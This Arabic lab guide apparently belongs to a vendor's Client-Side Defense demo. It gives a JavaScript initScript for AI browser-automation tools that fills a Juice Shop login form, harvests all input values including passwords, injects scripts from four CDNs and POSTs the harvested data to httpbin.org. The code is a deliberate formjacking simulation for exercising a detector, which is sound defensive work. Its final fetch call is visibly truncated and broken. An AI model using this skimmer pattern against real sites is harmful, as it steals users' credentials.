## كشف التهديدات

يراقب CSD سلوك JavaScript داخل المتصفح. على عكس WAF أو Bot Defense، لا يمكنك تفعيل كشف CSD باستخدام أوامر curl — فهو يتطلب نشاطاً حقيقياً للنصوص البرمجية على جانب المتصفح. يُفعّل النص البرمجي المُدمَج التالي جميع إشارات كشف CSD الثلاث في تنفيذ واحد: جمع حقول النماذج، وحقن نصوص برمجية من جهات خارجية من نطاقات CDN متعددة، وتسريب البيانات إلى نقاط نهاية خارجية.

### التنفيذ الآلي بالذكاء الاصطناعي

تنفذ مساعدات الذكاء الاصطناعي المزودة بأدوات أتمتة المتصفح (MCP Chrome DevTools، Playwright، Puppeteer) المحاكاة برمجياً بدلاً من اتباع الخطوات اليدوية أعلاه:

1. **التنقل مع initScript** — انتقل أولاً إلى `about:blank` لضمان سياق مستند نظيف، ثم `navigate_page` إلى عنوان URL لصفحة تسجيل الدخول (مثل `http://$F5XC_DOMAINNAME/#/login`) مع `initScript` يحفظ `setInterval` و `clearInterval` و `fetch` و `console.log` الأصلية قبل أن يقوم zone.js بتعديلها، ويستطلع حقول نموذج تسجيل الدخول، ويملأ بيانات الاعتماد عبر محدد `HTMLInputElement.prototype.value` الأصلي، وينفذ نص الكشف المُدمَج مباشرةً. استخدم initScript الحرفي أدناه.
2. **إغلاق لافتة الترحيب** — `press_key` بمفتاح `Escape` لإغلاق لافتة الترحيب. في الزيارات اللاحقة قد لا تظهر اللافتة (ملفات تعريف الارتباط محفوظة)
3. **انتظار الاكتمال** — انتظر 10 ثوانٍ لاكتمال جميع عمليات استدعاء تحميل/خطأ نصوص CDN البرمجية وحلول وعود fetch
4. **التقاط الأدلة** — `list_console_messages` للتحقق من `[CSD Demo] Simulation complete`؛ `list_network_requests` مُصفّاة حسب أنواع `script` و `fetch` للتحقق من أكواد حالة HTTP

**حزمة initScript (حرفية — تغلف نص الكشف المُدمَج للتنفيذ الآلي):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('input[type="email"]');
  var passEl  = document.querySelector('input[type="password"]');

    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });

        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
```

**ملاحظة حول `fetch` الأصلي:** تحفظ هذه الحزمة `window.fetch.bind(window)` لتجنب أخطاء zone.js. هذا هو السلوك الصحيح لجميع مراحل محاكاة الهجوم. يحظر تخفيف CSD تحميل النصوص البرمجية (عن طريق مسح قيم `src` لوسوم `&lt;script&gt;`)، وليس استدعاءات `fetch()`، لذا فإن حفظ مرجع fetch الأصلي لا يؤثر على سلوك التخفيف. يُستخدم نفس initScript للمرحلة 2 والمرحلة 3.

<Aside type="caution">
**عدم توافق zone.js** — يستخدم Juice Shop مكتبة zone.js الخاصة بـ Angular، والتي تعدّل `setTimeout` و `setInterval` و `fetch` و `XMLHttpRequest` وواجهات برمجة تطبيقات المتصفح الأخرى. يؤدي هذا إلى تعطل أدوات MCP `evaluate_script` و `fill` و `click` مع خطأ `Cannot read properties of undefined (reading 'call')`. استخدم `navigate_page` مع `initScript` بدلاً من ذلك — يعمل `initScript` قبل تحميل zone.js، مما يتيح لك حفظ مراجع واجهات برمجة التطبيقات الأصلية. يجب أن يملأ initScript حقول النموذج باستخدام محدد `HTMLInputElement.prototype.value` الأصلي (وليس أداة `fill`) وينفذ نص الكشف مباشرةً ضمن استدعاء `setInterval`.
</Aside>

<Aside type="note">
**تراكم initScript** — كل استدعاء `navigate_page` مع معامل `initScript` يضيف النص البرمجي إلى قائمة دائمة تعمل عند كل تحميل مستند لاحق في سياق المتصفح ذاته. لتجنب تداخل النصوص البرمجية القديمة، انتقل إلى `about:blank` بين التشغيلات أو استخدم `new_page` مع `isolatedContext` للحصول على سياق نظيف.
</Aside>

يستخدم المشغلون الذين لا يملكون أدوات أتمتة المتصفح الخطوات اليدوية أعلاه.

<Aside type="tip">
يستغرق الكشف **من 5 إلى 10 دقائق** ليظهر على لوحة تحكم CSD. إذا لم تكن التنبيهات مرئية بعد تشغيل النص البرمجي، تابع مع [جولة وحدة تحكم CSD](/csd/csd-console/) وتحقق لاحقاً.
</Aside>

### ماذا يفعل النص البرمجي

يُفعّل نص المحاكاة المُدمَج جميع إشارات كشف CSD الثلاث:

| السلوك | ما يفعله النص البرمجي | ما يراه CSD |
| --- | --- | --- |
| **جمع الحقول** | يقرأ القيم من عناصر `input` الموجودة (البريد الإلكتروني، كلمة المرور) | نصوص برمجية تقرأ حقول النماذج الحساسة — مُصنّفة عالية الخطورة |
| **حقن النصوص البرمجية** | يُلحق 4 وسوم `<script>` تُحمّل من `cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io` | 4 نطاقات نصوص برمجية جديدة من جهات خارجية على الصفحة |
| **تسريب البيانات** | يُرسل البيانات المجمعة عبر `fetch` إلى `www.httpbin.org` و `jsonplaceholder.typicode.com` | استدعاءات شبكة إلى نطاقات خارجية (ملاحظة: تظهر وجهات fetch كتفاعلات شبكة للنصوص البرمجية، وليس في عرض نطاقات الشبكة) |

<Aside type="note">
لدى CSD حدود كشف محددة — على سبيل المثال، يتم تتبع حقول DOM عند تحميل الصفحة فقط ويعرض عرض الشبكة نطاقات تحميل النصوص البرمجية فقط. راجع [حدود الكشف](/csd/overview/#detection-boundaries) للاطلاع على القائمة الكاملة.
</Aside>

### محاكاة متقدمة

النص البرمجي المُدمَج أعلاه هو نسخة مبسطة من 3 مراحل (جمع، حقن، تسريب) مناسبة لمعظم العروض التوضيحية. توفر [مكتبة نصوص الهجوم](/csd/attack-scripts/) 10 نصوص برمجية مُستهدَفة منظمة حسب نوع الهجوم، بما في ذلك اختبار إجهاد **الكشف الأقصى** الذي يضيف التلاعب بـ DOM وتسريب ملفات تعريف الارتباط وقنوات إشارات الصور فوق تغطية النص المُدمَج. استخدم النصوص البرمجية الفردية لعرض فئات هجوم محددة (سرقة النماذج، القشط الرقمي، حقن سلسلة التوريد، تسريب البيانات، التلاعب بـ DOM) بشكل منفصل.
